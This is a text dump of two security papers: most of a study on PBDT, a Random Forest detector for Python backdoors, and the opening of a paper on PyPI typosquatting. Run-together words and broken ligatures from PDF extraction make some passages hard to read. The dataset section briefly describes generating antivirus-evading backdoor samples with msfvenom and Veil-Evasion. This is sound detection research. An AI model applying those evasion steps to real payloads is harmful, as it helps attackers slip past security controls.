Networks\\n 2037, 2021, 1, Downloaded from https://onlinelibrary.wiley.com/doi/10.1155/2021/9923234 by Morocco Hinari NPL, Wiley Online Library on [25/03/2025]. See the Terms and Conditions (https://onlinelibrary.wiley.com/terms-and-conditions) on Wiley Online Library for rules of use; OA articles are governed by the applicable Creative Commons License\\n4.1.Dataset. 'ecurrentresearchonmaliciousPythoncode\\nis limited, and there is no relatively comprehensive and\\nauthoritative public dataset. We have extensively collected\\nvarious Python \\ufb01les from the open-source library GitHub,\\nincluding malicious backdoors and benign codes. Together,\\nsince there are few public backdoor samples, we also used\\nsometoolstogeneratethem.Intheend,1,511whitesamples\\nand 515 black samples were obtained. In each experiment,\\nthey are randomly divided into 70% training set and 30%\\ntesting set to avoid the fortuity of results. 'e primary data\\nsources are shown in Table 4.\\n4.1.1. Backdoor Data. 'e backdoor samples are mainly\\ndivided into three categories:\\n(1) First of all, we collected a wide range of GitHub\\nprojects, including webshells, reverse shells, C/S\\nbackdoors written in Python language, and so on.\\n'e collected \\ufb01les were marked in the project in-\\ntroduction and veri\\ufb01ed by manual inspection to be\\nmalicious.\\n(2) Another part of the samples are generated using\\nMetasploit Framework (MSF), an open-source se-\\ncurity vulnerability detection tool with functions\\nincluding the whole penetration testing process. 'e\\nmsfvenom module can generate Trojan programs.\\nWe have obtained part of the rebound shell through\\nthis tool, includingsome samples encoded by base64\\nor containing shellcode.\\n(3) In actual applications, backdoors are mostly obfus-\\ncated. In order to obtain more comprehensive data,\\nweusetheVeil-Evasionanti-virustool,whichcanbe\\nused to generate Metasploit payloads and bypass\\nstandard software detection or killing. Combining\\nthesetwotools,ahigh-qualitysamplethatcanbypass\\nsecurity controls is obtained.\\n4.1.2. Benign Data. 'e benign samples are all obtained\\nfrom GitHub, including the Python code of various basic\\nfunctions.Toensurethedata\\u2019saccuracy,wetrytochoosethe\\nproject with more stars, which shows that the project has a\\nhighdegree ofrecognition.'estandardcode withordinary\\ncommunication function has some functional similarities to\\nthe backdoor, which may cause false positive in practical\\napplications. 'erefore, some samples like this are added to\\nthe benign dataset to ensure the accuracy of \\ufb01nal training\\nmodel\\u2019s classi\\ufb01cation.\\n4.2. Evaluation Index. Choosing appropriate evaluation\\nindicators is the key to the experiment. K-fold cross-vali-\\ndation is a conventional method for model evaluation.\\nGenerally, within a speci\\ufb01c range, the evaluation accuracy\\nwillincreasewiththeKvalueincrease.However,thenumber\\nof datasets in this paper is limited. When the K value is\\nconsiderable, the test samples are small so that the result\\u2019s\\nvalidity cannot be guaranteed. 'erefore, for each type of\\nexperimentdescribedbelow,thedatasetisrandomlydivided\\ninto a training set and testing set at a ratio of 7:3 and re-\\npeated ten times at the same time to calculate the average\\nvalue of each indicator. 'is avoids the fortuity of the ex-\\nperimental results and reduces the number of samples\\u2019\\nimpact.\\n'is paper is a typical two-category problem. 'e\\nsamplewillbedividedintopositiveandnegative,andthere\\nare four possible results, as shown in the confusion matrix\\nin Table 5. 'e horizontal direction is predicted category,\\nand the vertical direction is actual category. In the matrix,\\nTP (true positive) represents the number of correctly\\nclassi\\ufb01ed Python backdoors. FP (false positive) represents\\nthe number of benign samples that are mistaken as\\nbackdoors. TN (true negative) represents the number of\\nbenign samples that are correctly classi\\ufb01ed. Furthermore,\\nFN (false negative) indicates the number of backdoor\\nsamples that are mistaken as non-malicious. Based on the\\nconfusion matrix, this paper uses the following evaluation\\nindicators:\\naccuracy \\ufffd TP+ TN\\nTP+ TN+ FP+ FN,\\nprecision \\ufffd TP\\nTP+ FP,\\nrecall \\ufffd TP\\nTP+ FN,\\nTNR \\ufffd TN\\nFP+ TN,\\nF1 \\ufffd 2\\u00d7 precision\\u00d7 recall\\nprecision+ recall .\\n(4)\\nIn the above indicators, the accuracy represents the\\nproportion of correctly classi\\ufb01ed samples in all samples. 'e\\nprecision represents the probability that the samples pre-\\ndicted to be backdoors are malicious, while the recall rep-\\nresents the proportion of the actual backdoor samples that\\nare correctly predicted (also called TPR, true positive rate).\\nTNR (true negative rate) represents the ratio of correct\\npredictions in actual benign samples, and F1 is the average\\nindex of precision and recall. In addition to the above \\ufb01ve\\nvalues, we also visually compare each algorithm\\u2019s perfor-\\nmance by drawing ROC (receiver operating characteristic)\\ncurves (Section 4.3.2).\\nT able4: Statistics from the main sources of data.\\nType Source\\nBenign\\nhttps://github.com/'eAlgorithms/Python\\nhttps://github.com/Lawouach/WebSocket-for-python\\nhttps://github.com/facert/socket-example\\nhttps://github.com/geekcomputers/Python\\nBackdoor\\nMetasploit generation\\nVeil-Evasion+Metasploit generation\\nhttps://github.com/xl7dev/WebShell/tree/master/\\npython\\nhttps://github.com/JustinTom/Packet-Sni\\ufb03ng-\\nbackdoor\\nSecurity and Communication Networks 9\\n 2037, 2021, 1, Downloaded from https://onlinelibrary.wiley.com/doi/10.1155/2021/9923234 by Morocco Hinari NPL, Wiley Online Library on [25/03/2025]. See the Terms and Conditions (https://onlinelibrary.wiley.com/terms-and-conditions) on Wiley Online Library for rules of use; OA articles are governed by the applicable Creative Commons License\\n4.3. Basic Experiment. First, we make experimental selec-\\ntions on the value ofn during the two n-gram processing in\\nSection 3.3. At the same time, in order to verify the e\\ufb00ec-\\ntiveness of each feature, we select various features indi-\\nvidually or remove them from the full features to evaluate\\nthe capability of the model. In terms of classi\\ufb01er selection,\\nwe compare the commonly used machine learning algo-\\nrithms with the Random Forest used in this paper to ensure\\nthat the optimal algorithm is used. In this section\\u2019s exper-\\niments, under the premise of comprehensively considering\\nmodel e\\ufb03ciency and detection accuracy, when training the\\nFastText model, the parameter word vector dimension is\\nselected as 30. Meanwhile, the epochs value is 300, and the\\nnumber of decision trees in the Random Forest is set to 100.\\n4.3.1. Reasonability of n in N-gram. Both FastText and TF-\\nIDF in the feature involve the value ofn in n-gram. We\\ndesign experiments to verify the rationality ofn. When n\\ntakes di\\ufb00erent values, a line graph is drawn for the model\\u2019s\\naccuracy and recall. 'e results are shown in Figure 3.\\nItisfoundthatbothindicatorsmaintainarelativelyhigh\\nlevel whenn \\ufffd 5, indicating that the value ofn in the feature\\nis reasonable. When it is lower, it cannot accurately rep-\\nresent the complete sentence information of the Python\\nopcode. When it is higher, the opcode sequence appears too\\nfew times in the code, son \\ufffd 5 can better represent the\\nPython opcode\\u2019s relevant features.\\n4.3.2. Feature Validity. All features are divided into three\\ncategories here. 'e text\\u2019s statistical features in Section 3.3.2\\nare relatively simple and cannot accurately represent the\\nsample, so the FastText feature in Section 3.3.3 is added to\\nthis category. Since the opcode feature of the malicious\\nfunction line in Section 3.3.3 is based on the suspicious\\nfunction de\\ufb01ned in Section 3.3.1, it is included in the call\\nfeature. 'ree types of call features, text statistics and\\nFastTextfeatures,andfull-textopcodefeaturesareseparately\\nsent to the Random Forest classi\\ufb01er. We simultaneously\\ncombine them for experiments and compare them with all\\nfeatures. 'e experimental results are shown in Table 6.\\nIt can be seen that various features have certain classi-\\n\\ufb01cation e\\ufb00ects, but their performance is limited. After re-\\nmoving any type of features, the classi\\ufb01er\\u2019s various indicators\\nhave declined, indicating that each feature plays an indis-\\npensable role in training the \\ufb01nal model. 'e hybrid features\\nproposed in this paper can better identify the Python back-\\ndoor, with an accuracy of 97.70% and a TNR of 98.66%.\\n4.3.3. Classi\\ufb01er E\\ufb00ectiveness. In order to verify the e\\ufb00ec-\\ntiveness of the algorithm, some classic machine learning\\nalgorithmsthatarewidelyusedinresearchareselected,and\\nthe comprehensive feature\\u2019s training model is used to\\ncompare the performance with the Random Forest clas-\\nsi\\ufb01er. 'e algorithms considered here include XGBoost,\\nNaive Bayes, and Support Vector Machine. In order to\\ncompare the e\\ufb00ects of each model more intuitively, the\\nROC curve of each algorithm during the test is drawn, as\\nshown in Figure 4.\\n'e algorithm\\u2019s e\\ufb00ect can be judged by the graph area\\u2019s\\nsize formed by the ROC curve and thex-axis. 'e graph\\nshows that the Random Forest has the best e\\ufb00ect, followed\\nby XGBoost, Naive Bayes, and Support Vector Machine.\\n'erefore, it can be considered that the Random Forest\\nclassi\\ufb01er has the best applicability in Python backdoor\\ndetection.\\n4.4. Comparative Experiment. To further illustrate the\\nadvantages of PBDT in detecting Python backdoors,\\nseveral representative models are selected for comparison\\nof experimental data. 'ere are very few previous papers\\nabout Python malicious code detection, so we will use\\nwebshell detection-related methods to reproduce the ex-\\nperiment. Moreover, due to the limited dataset, the deep\\nneural network method may cause over\\ufb01tting and cannot\\nachieve better results, so the classic machine learning\\nmodels are used.\\n0.90\\n0.92\\n0.94\\n0.96Rate\\n234 615\\nThe value of in n_gram\\naccuracy\\nrecall\\nFigure 3: Corresponding indicators for di\\ufb00erent values of n.\\nT able5: Confusion matrix.\\nPredict backdoor Predict benign\\nActual backdoor TP FN\\nActual benign FP TN\\nT able 6: Performance comparison of di\\ufb00erent feature\\ncombinations.\\nFeatures Accuracy Precision Recall\\n(TPR) TNR F1-\\nscore\\n#1 Call 0.9342 0.8805 0.8696 0.9575 0.8750\\n#2 Text 0.9391 0.9026 0.8634 0.9664 0.8825\\n#3 Opcode 0.9441 0.8757 0.9193 0.9530 0.8970\\n#1+#2 0.9589 0.9146 0.9317 0.9687 0.9231\\n#1+#3 0.9638 0.9264 0.9379 0.9732 0.9321\\n#2+#3 0.9473 0.8817 0.9255 0.9553 0.9030\\nPBDT #1+#2+#3 0.9770 0.9623 0.9503 0.9866 0.9563\\n10 Security and Communication Networks\\n 2037, 2021, 1, Downloaded from https://onlinelibrary.wiley.com/doi/10.1155/2021/9923234 by Morocco Hinari NPL, Wiley Online Library on [25/03/2025]. See the Terms and Conditions (https://onlinelibrary.wiley.com/terms-and-conditions) on Wiley Online Library for rules of use; OA articles are governed by the applicable Creative Commons License\\nFang et al. [22] used FastText to detect webshell. 'e\\nmethod is similar to the synthesis of feature 2 and FastText\\nfeaturesinSection4.3.2.'edi\\ufb00erenceisthatthestatistical\\ntextfeatureofcompressionrateisnotconsidered,and n \\ufffd 4\\nis selected for n-gram value of FastText, whilen \\ufffd 5 is used\\nin this paper. Cui et al. [18] used Random Forest and\\nGradient Boosting Decision Tree comprehensive algo-\\nrithms to distinguish webshells. 'ey also considered six\\ntypes of text statistical features. Besides, they used TF-IDF\\nand Hash, two types of vectors to represent opcode se-\\nquences, and obtained sequence classi\\ufb01cation labels\\nthrough Random Forest classi\\ufb01ers. After synthesizing the\\n\\ufb01rst six types of features, the \\ufb01nal prediction result was\\nobtained through the GBDT classi\\ufb01er. Unlike this paper,\\nTF-IDF represents the frequency of a single character. Guo\\net al. [38] recognized webshell attacks through opcode and\\nalso used TF-IDF to represent text. However, the bi-gram\\nwas used to divide characters, and the \\ufb01nal classi\\ufb01er chose\\nNaive Bayes (the method of the paper below is represented\\nby the author\\u2019s last name).\\nWe use the dataset of this paper to reproduce the above\\nthree experiments, and compare the performance with\\nPBDT. 'e results are shown in Table 7. It should be noted\\nthat most of the parameter selection in the experiment is\\ndescribed in the original text, but some adjustments are\\nmade due to di\\ufb00erent applicable scenarios. For the part\\nrelated to the text\\u2019s statistical characteristics, the \\ufb01rst two\\npapers are aimed at PHP webshells. 'e dangerous char-\\nactersproposedarealsorelatedtothePHPlanguage.Wewill\\nreplacethemwiththePythonbackdoordangerouskeywords\\nlisted in Section 3.2.6. 'e TF-IDF vector dimension chosen\\nby Cui [18] is 146 because it is for a single character, and\\nthereare146typesofopcodesinPHP.'ereare121typesof\\nPython opcodes in this experiment, so the vector dimension\\nis set to 121.\\n'e table\\u2019s data intuitively shows that PBDT is signi\\ufb01-\\ncantly better than the other three solutions. In-depth\\nanalysis,thealgorithmusedbyGuoetal.[38]isNaiveBayes.\\nIn Section 4.3.3, we have compared the algorithms, and the\\nRandom Forest performs better in the classi\\ufb01cation of Py-\\nthon backdoors. Random Forest is a combination of mul-\\ntiple decision trees with strong generalization ability. At the\\nsame time, the risk of over\\ufb01tting is reduced by averaging\\ndecision trees, and it performs well for the classi\\ufb01cation of\\nhigh-dimensionaldata.'eNaiveBayesmodelassumesthat\\nthe attributes are independent of each other, and the clas-\\nsi\\ufb01cation e\\ufb00ect is not good when the number of attributes is\\nrelatively large or the correlation between attributes is rel-\\natively large. 'e classi\\ufb01cation object of this paper is the\\nentire Python \\ufb01le. File sizes and structures vary greatly.\\nDi\\ufb00erent malicious \\ufb01les may have di\\ufb00erent manifestations,\\nand the location of suspicious statements in the code is\\nuncertain. At the same time, the feature dimension used is\\nhigher,andtheinternalcorrelationofsimilarfeaturesisalso\\ngreater. 'erefore, compared with the Naive Bayes used by\\nGuo et al. [38], Random Forest is more suitable for the\\nsample scenario in this paper. Simultaneously, the bi-gram\\nonly expresses the relationship between the adjacent opc-\\nodes, and the opcode to express a complete sentence of\\nPythonlanguage needs\\ufb01veormore,sothen \\ufffd 5used inthis\\npaper can better represent the semantic information of the\\ntext. 'e reason for the signi\\ufb01cantly lower precision of this\\nscheme is the imbalance in the number of positive and\\nnegative samples.\\n'esameistruefortheselectionof n inFangetal.\\u2019s[22]\\nFastText model. We have proved through a lot of experi-\\nments thatn \\ufffd 5 can guarantee the best model performance.\\n'e TF-IDF vector and hash vector in Cui [18] only rep-\\nresentthemappingrelationshipbetweenasingleopcodeand\\nthe vector and do not re\\ufb02ect the contextual connection.\\n'erefore, the classi\\ufb01cation e\\ufb00ect is not excellent. 'e es-\\nsenceofn-gramistodividethesequenceofopcodesintothe\\nsmallest subblocks that can represent code information. It\\ntakes5ormoretoexpressacompletesentenceofopcodesin\\nthe Python language. For example, for the commonly used\\nsocket connection statement \\u201csocket.socket (sock-\\net.AF_INET, socket.SOCK_STREAM)\\u201d in the backdoor, the\\ncorresponding opcode sequence is \\u201c[\\u201cLOAD_NAME\\u201d,\\n\\u201cLOAD_METHOD\\u201d, \\u201cLOAD_NAME\\u201d,\\n\\u201cLOAD_ATTR\\u201d, \\u201cLOAD_NAME\\u201d, \\u201cLOAD_ATTR\\u201d,\\n\\u201cCALL_METHOD\\u201d,\\u201cRETURN_VALUE\\u201d]\\u201d.'e numberof\\nopcodes is 8, and the more parameters in the function call,\\nthe longer the sequence length. Consequently, the value ofn\\nROC Curve\\n0.025 0.050 0.075 0.100 0.1750.150 0.2000.000 0.125\\nFalse Positive Rate\\n0.0\\n0.2\\n0.4\\n0.6\\n0.8\\n1.0True Positive Rate\\nNaive Bayes (auc = 0.94)\\nSupport Vector Machine (auc = 0.97)\\nRandom Forest (auc = 0.99)\\nXGboost (auc = 0.98)\\nFigure 4: ROC curves of di\\ufb00erent algorithms.\\nT able7: Performance comparison with other models.\\nAccuracy Precision Recall\\n(TPR) TNR F1-\\nscore\\nGuo et al.\\n[38] 0.8355 0.6393 0.8696 0.8233 0.7368\\nCui [18] 0.9122 0.8961 0.7565 0.9682 0.8201\\nFang et al.\\n[22] 0.9391 0.8563 0.9255 0.9441 0.8896\\nPBDT 0.9770 0.9623 0.9503 0.9866 0.9563\\nSecurity and Communication Networks 11\\n 2037, 2021, 1, Downloaded from https://onlinelibrary.wiley.com/doi/10.1155/2021/9923234 by Morocco Hinari NPL, Wiley Online Library on [25/03/2025]. See the Terms and Conditions (https://onlinelibrary.wiley.com/terms-and-conditions) on Wiley Online Library for rules of use; OA articles are governed by the applicable Creative Commons License\\nshould not be too small. Cui\\u2019s [18] method is similar to the\\nvalue n \\ufffd 1, and Fang et al.\\u2019s [22] method isn \\ufffd 4, neither of\\nwhich can e\\ufb00ectively represent the code semantic infor-\\nmation. 'erefore, the value ofn in this paper is reasonable\\nand e\\ufb00ective for classi\\ufb01cation.\\nIn summary, compared with previous research, PBDT\\ncan better identify malicious Python backdoor.\\n5. Conclusion\\nInordertoensuretheconcealmentofbackdoor,theattacker\\nwill obfuscate and encode the code. Concurrently, the parts\\nof the text that are not related to the function will also a\\ufb00ect\\nthe detection e\\ufb00ect. But the encoding often has apparent\\ncharacteristics,andtheinterferenceitemssuchascomments\\nwill not be compiled. 'is paper proposes and constructs a\\nPython backdoor detection model PBDT, representing the\\ntext through the statistical features caused by obfuscation\\nand the features of opcode sequence in the compilation, and\\nmatchesthesuspiciousmodulesandfunctionsinthecodeas\\nwell. 'e above features can be used for backdoor recog-\\nnition, respectively. However, experiments have proved that\\nthe detection e\\ufb00ect of comprehensive features is the best.\\nWhen using the Random Forest classi\\ufb01er, the accuracy of\\n97.70% and the TNR of 98.66% can be obtained.\\nCompared with the dynamic detection which requires\\nhigh detection environment and the deep learning that\\nconsumes a lot of resources, the static detection scheme\\nbasedonmachinelearningproposedinthispapercanobtain\\nbetterdetectionresultswithlimitedresources.Whatismore,\\nunderthepremisethatthedatasetcontainssomeobfuscated\\nsamples, it has a signi\\ufb01cant performance improvement\\ncomparedwiththepreviouslyproposedwebshell\\u2019sdetection\\nmethod. However, this scheme covers many aspects and has\\nan extensive feature dimension. How to obtain better de-\\ntection performance with limited feature dimensions is a\\ndirection worthy of our future research. At the same time,\\nexploring the characteristics of other programming lan-\\nguage\\u2019s backdoor scripts is also a valuable work. 'e design\\nideaofthispaperisalsoapplicabletoothermaliciousPython\\ncode detection.\\nData Availability\\n'e data used to support the \\ufb01ndings of this study are in-\\ncluded within the article.\\nConflicts of Interest\\n'e authors declare that there are no con\\ufb02icts of interest\\nregarding the publication of this study.\\nAcknowledgments\\n'is paper was supported in part by the National Natural\\nScience Foundation of China (U20B2045) and National Key\\nResearch and Development Program of China (Grant no.\\n2016QY13Z2302).\\nReferences\\n[1] Malwarebytes Labs, \\u201c2020 state of malware report,\\u201d 2020,\\navaible at: https://resources.malwarebytes.com/\\ufb01les/2020/02/\\n2020_State-of-Malwarebytes.Report.pdf.\\n[2] Y.D.Lawrence,D.LiangLee,Y.-H.Chen,andL.XiangYann,\\nLexicalanalysisforthewebshellattacks,\\u201d in Proceedings of the\\n2016 International Symposium On Computer, Consumer And\\nControl (IS3C), pp. 579\\u2013582, IEEE, Xi\\u2019an, China, July 2016.\\n[3] O. Starov, J. Dahse, S. S. Ahmad, T. Holz, and N. Nikiforakis,\\n\\u201cNo honor among thieves: a large-scale analysis of malicious\\nweb shells,\\u201d inProceedings of the 25th International Confer-\\nence on World Wide Web, pp.1021\\u20131032, Montr\\u00b4eal, Canada,\\nApril 2016.\\n[4] C. Wang, H. Yang, Z. Zhao, L. Gong, and Z. Li, \\u201c'e research\\nand improvement in the detection of PHP variable webshell\\nbased oninformation entropy,\\u201dJournal of Computers,vol.28,\\npp. 62\\u201368, 2016.\\n[5] M. Peter and B. V. W. Irwin, \\u201cTowards a PHP webshell\\ntaxonomy using deobfuscation-assisted similarity analysis,\\u201d\\nIEEE, in Proceedings of the 2015 Information Security for\\nSouth Africa (ISSA), pp. 1\\u20138, Johannesburg, South Africa,\\nAugust 2015.\\n[6] H. Zhang, M. Liu, Z. Yue, Z. Xue, Y. Shi, and X. He, \\u201cA PHP\\nandJSP web shelldetection systemwithtext processing based\\non machine learning,\\u201d inProceedings of the 2020 IEEE 19th\\nInternational Conference on Trust, Security and Privacy in\\nComputing and Communications (TrustCom), pp.1584\\u20131591,\\nIEEE, Guangzhou, China, January 2020.\\n[7] Z. Zhang, M. Li, L. Zhu, and X. Li, \\u201cSmartdetect: a smart\\ndetection scheme for malicious web shell codes via ensemble\\nlearning,\\u201d in Proceedings of the International Conference on\\nSmart Computing and Communication, Tokyo, Japan, De-\\ncember 2018.\\n[8] Z. Zhao, Q. Liu, T. Song, Z. Wang, and X. Wu, \\u201cWSLD:\\ndetecting unknown webshell using fuzzy matching and deep\\nlearning,\\u201d inProceedings of the International Conference on\\nInformation and Communications Security, pp. 725\\u2013745,\\nSpringer, Beijing, China, December 2019.\\n[9] D. Canali and D. Balzarotti, \\u201cBehind the scenes of online\\nattacks: an analysis of exploitation behaviors on the web,\\u201d in\\nProceedings of the 20th Annual Network & Distributed System\\nSecurity Symposium (NDSS 2013), San Diego, CA, USA,\\nFebruary 2013.\\n[10] M. Xie and J. Hu, \\u201cEvaluating host-based anomaly detection\\nsystems: a preliminary analysis of adfa-ld,\\u201d inProceedings of\\nthe 2013 6th International Congress on Image and Signal\\nProcessing (CISP), vol. 3, pp. 1711\\u20131716, IEEE, Hangzhou,\\nChina, December 2013.\\n[11] Z.-H. Lv, H.-B. Yan, and R. Mei, \\u201cAutomatic and accurate\\ndetection of webshell based on convolutional neural net-\\nwork,\\u201d in Proceedings of the China Cyber Security Annual\\nConference, pp. 73\\u201385, Springer, Beijing, China, August 2018.\\n[12] Y. Tian, J. Wang, Z. Zhou, and S. Zhou, \\u201cCNN-webshell:\\nmalicious web shell detection with convolutional neural\\nnetwork,\\u201d inProceedings of the 2017 6th International Con-\\nference on Network, Communication and Computing,\\npp. 75\\u201379, Kunming, China, December 2017.\\n[13] Z. Wang, J. Yang, M. Dai, R. Xu, and X. Liang, \\u201cA method of\\ndetecting webshell based on multi-layer perception,\\u201d Aca-\\ndemic Journal of Computing & Information Science,vol.2,p.1,\\n2019.\\n[14] B. Yong,X. Liu, Y. Liu, H. Yin, L. Huang, andQ. Zhou, \\u201cWeb\\nbehavior detection based on deep neural network,\\u201d in\\n12 Security and Communication Networks\\n 2037, 2021, 1, Downloaded from https://onlinelibrary.wiley.com/doi/10.1155/2021/9923234 by Morocco Hinari NPL, Wiley Online Library on [25/03/2025]. See the Terms and Conditions (https://onlinelibrary.wiley.com/terms-and-conditions) on Wiley Online Library for rules of use; OA articles are governed by the applicable Creative Commons License\\nProceedings of the 2018 IEEE SmartWorld, Ubiquitous Intel-\\nligence & Computing, Advanced & Trusted Computing,\\nScalable Computing & Communications, Cloud & Big Data\\nComputing, Internet of People and Smart City Innovation\\n(SmartWorld/SCALCOM/UIC/ATC/CBDCom/IOP/SCI),\\npp. 1911\\u20131916, IEEE, Guangzhou, China, October 2018.\\n[15] S. L. 'omas and A. Francillon, \\u201cBackdoors: de\\ufb01nition, de-\\nniability and detection,\\u201d inProceedings of the 25th Interna-\\ntional Symposium on Research in Attacks, Intrusions, and\\nDefenses, pp. 92\\u2013113, Springer, Heraklion, Greece, September\\n2018.\\n[16] B. Scott and B. Hagen, \\u201cWeb shell detection using NeoPI,\\u201d\\n2011, https://resources.infosecinstitute.com/topic/web-shell-\\ndetection/.\\n[17] A. Fass, M. Backes, and B. Stock, \\u201cJStap: a static pre-\\ufb01lter for\\nmalicious javascript detection,\\u201d in Proceedings of the 35th\\nAnnual Computer Security Applications Conference, pp. 257\\u2013\\n269, San Juan, PR, USA, December 2019.\\n[18] H.Cui,\\u201cWebshelldetectionbasedonrandomforest\\u2013gradient\\nboosting decision tree algorithm,\\u201d inProceedings of the IEEE\\n3rd International Conference on Data Science in Cyberspace\\n(DSC), June 2018.\\n[19] J.Wang,Y. Xue,Y.Liu,andH.Tian,\\u201cJsdc:ahybridapproach\\nfor javascript malware detection and classi\\ufb01cation,\\u201d inPro-\\nceedings of the 10th ACM Symposium on Information,\\nComputer and Communications Security, pp. 109\\u2013120, Sin-\\ngapore, April 2015.\\n[20] T. D. Tu, G. Cheng, X. Guo, and W. Pan, \\u201cWebshell detection\\ntechniques in web applications,\\u201d in Proceedings of the 5th\\nInternational Conference on Computing, Communications and\\nNetworking Technologies (ICCCNT), pp. 1\\u20137, IEEE, Hefei,\\nChina, July 2014.\\n[21] I. A. Al-Taharwa, H.-M. Lee, A. Jeng, K. Wu, C. Ho, and\\nS.Chen,\\u201cJSOD:javascriptobfuscationdetector,\\u201d Security and\\nCommunication Networks, vol. 8, no. 6, pp. 1092\\u20131107, 2015.\\n[22] Y. Fang, Y. Qiu, L. Liu, and C. Huang, \\u201cDetecting webshell\\nbased on random forest with fasttext,\\u201d inProceedings of the\\n2018 International Conference on Computing and Arti\\ufb01cial\\nIntelligence, pp. 52\\u201356, Chengdu China, March 2018.\\n[23] Z. Pan, Y. Chen, Y. Chen, Y. Shen, and X. Guo, \\u201cWebshell\\ndetection based on executable data characteristics of PHP\\ncode,\\u201dWireless communications and mobile computing,\\nvol. 2021, Article ID 5533963, 12 pages, 2021.\\n[24] Y.Wu,Y.Ma,andS.Wan,\\u201cMulti-scalerelationreasoningfor\\nmulti-modal visual question answering,\\u201d Signal Processing:\\nImage Communication, vol. 96, Article ID 116319, 2021.\\n[25] S. Ding, S. Qu, Y. Xi, and S. Wan, \\u201cStimulus-driven and\\nconcept-driven analysis for image caption generation,\\u201d\\nNeurocomputing, vol. 398, pp. 520\\u2013530, 2020.\\n[26] S. Ndichu, S. Ozawa, T. Misu, and K. Okada, \\u201cA machine\\nlearning approach to malicious JavaScript detection using\\n\\ufb01xed length vector representation,\\u201d inProceedings of the 2018\\nInternational Joint Conference on Neural Networks (IJCNN),\\npp. 1\\u20138, IEEE, Rio de Janeiro, Brazil, July 2018.\\n[27] H. C. Kim, Y. H. Choi and H. L. Dong, JsSandbox: a\\nframework for analyzing the behavior of malicious JavaScript\\ncode using internal function hooking,\\u201dKSII Transactions on\\nInternet & Information Systems, vol. 6, p. 2, 2012.\\n[28] K.Rieck,T.Krueger,andA.Dewald,\\u201cCujo:e\\ufb03cientdetection\\nand preventionof drive-by-download attacks,\\u201d inProceedings\\nof the 26th Annual Computer Security Applications Confer-\\nence, pp. 31\\u201339, Austin, TX, USA, December 2010.\\n[29] A. Fass, M. Backes, and B. Stock, \\u201cHidenoseek: camou\\ufb02aging\\nmaliciousjavascriptinbenignasts,\\u201din Proceedings of the 2019\\nACM SIGSAC Conference on Computer and Communications\\nSecurity, pp. 1899\\u20131913, London, UK, November 2019.\\n[30] A. Fass, R. P. Krawczyk, M. Backes, and B. Stock, \\u201cJaSt: fully\\nsyntactic detection of malicious (obfuscated) javascript,\\u201d in\\nProceedings of the International Conference on Detection of\\nIntrusions and Malware, and Vulnerability Assessment,\\npp. 303\\u2013325, Springer, Saclay, France, June 2018.\\n[31] A. Kapravelos, S. Yan, M. Cova, C. Kruegel, and G. Vigna,\\n\\u201cRevolver: an automated approach to the detection of evasive\\nweb-based malware,\\u201d in Proceedings of the 22nd USENIX\\nSecurity Symposium (USENIX Security, vol. 13, pp. 637\\u2013652,\\nWashington, DC, USA, August 2013.\\n[32] L.Yu,J.Huang,I.Ademola,M.Mitchell,J.Zhang,andR.Dai,\\n\\u201cShellbreaker: automatically detecting PHP-based malicious\\nweb shells,\\u201dComputers & Security, vol. 87, Article ID 101595,\\n2019.\\n[33] Z.Li,A.Qi,C.Xiong,Y.Chen,T.Zhu,andH.Yang,\\u201cE\\ufb00ective\\nand light-weight deobfuscation and semantic-aware attack\\ndetection for powershell scripts,\\u201d inProceedings of the 2019\\nACM SIGSAC Conference on Computer and Communications\\nSecurity, pp. 1831\\u20131847, London, UK, November 2019.\\n[34] C. E. Shannon, \\u201cA mathematical theory of communication,\\u201d\\n1e Bell System Technical Journal, vol. 27, no. 3, pp. 379\\u2013423,\\n1948.\\n[35] J. Ramos, \\u201cUsing tf-idf to determine word relevance in\\ndocument queries,\\u201d in Proceedings of the 1st Instructional\\nConference On Machine Learning, vol. 242, pp.133\\u2013142, New\\nJersey, NJ, USA, August 2003.\\n[36] J. Armand, E. Grave, P. Bojanowski, and T. Mikolov, \\u201cBag of\\ntricks for e\\ufb03cient text classi\\ufb01cation,\\u201d 2016, https://arxiv.org/\\nabs/1607.01759.\\n[37] T.K.Ho,\\u201cRandomdecisionforests,\\u201din Proceedings of the 3rd\\ninternational conference on document analysis and recogni-\\ntion, vol. 1, pp. 278\\u2013282, Montreal, Canada, August 1995.\\n[38] Y. Guo, H. Marco-Gisbert, and K. Paul, \\u201cMitigating webshell\\nattacks through machine learning techniques,\\u201d Future In-\\nternet, vol. 12, p. 1, 2020.\\nSecurity and Communication Networks 13\\n 2037, 2021, 1, Downloaded from https://onlinelibrary.wiley.com/doi/10.1155/2021/9923234 by Morocco Hinari NPL, Wiley Online Library on [25/03/2025]. See the Terms and Conditions (https://onlinelibrary.wiley.com/terms-and-conditions) on Wiley Online Library for rules of use; OA articles are governed by the applicable Creative Commons License\\n\"\n",
      "}\n",
      "score: 0.15708069798089888\n",
      "{\n",
      "  \"metadata\": {\n",
      "    \"/IEEE Issue ID\": \"9229648\",\n",
      "    \"/Producer\": \"OpenPDF 1.0.0-SNAPSHOT; modified using iText\\u00ae 7.1.1 \\u00a92000-2018 iText Group NV (AGPL-version)\",\n",
      "    \"/IEEE Article ID\": \"9229803\",\n",
      "    \"/Title\": \"Typosquatting and Combosquatting Attacks on the Python Ecosystem\",\n",
      "    \"/IEEE Publication ID\": \"9229477\",\n",
      "    \"/Meeting Ending Date\": \"11 Sept. 2020\",\n",
      "    \"/Meeting Starting Date\": \"7 Sept. 2020\",\n",
      "    \"/Subject\": \"2020 IEEE European Symposium on Security and Privacy Workshops (EuroS&PW);2020; ; ;10.1109/EuroSPW51379.2020.00074\",\n",
      "    \"/ModDate\": \"D:20201020162348-04'00'\",\n",
      "    \"/CreationDate\": \"D:20201014200339Z\"\n",
      "  },\n",
      "  \"data\": \"Typosquatting and Combosquatting Attacks on the\\nPython Ecosystem\\nDuc-Ly Vu, Ivan Pashchenko, Fabio Massacci\\nUniversity of Trento, Italy\\n{ducly.vu, ivan.pashchenko, fabio.massacci}@unitn.it\\nHenrik Plate, Antonino Sabetta\\nSAP Security Research, France\\n{henrik.plate, antonino.sabetta}@sap.com\\nAbstract\\u2014Limited automated controls integrated into the\\nPython Package Index (PyPI) package uploading process make\\nPyPI an attractive target for attackers to trick developers into\\nusing malicious packages. Several times this goal has been\\nachieved via the combosquatting and typosquatting attacks when\\nattackers give malicious packages similar names to already exist-\\ning legitimate ones. In this paper , we study the attacks, identify\\npotential attack targets, and propose an approach to identify\\ncombosquatting and typosquatting package names automatically.\\nThe approach might serve as a basis for an automated system that\\nensures the security of the packages uploaded and distributed via\\nPyPI.\\nIndex T erms\\u2014FOSS, Malicious Software, Supply Chain At-\\ntacks, Combosquatting, Typosquatting, Python, 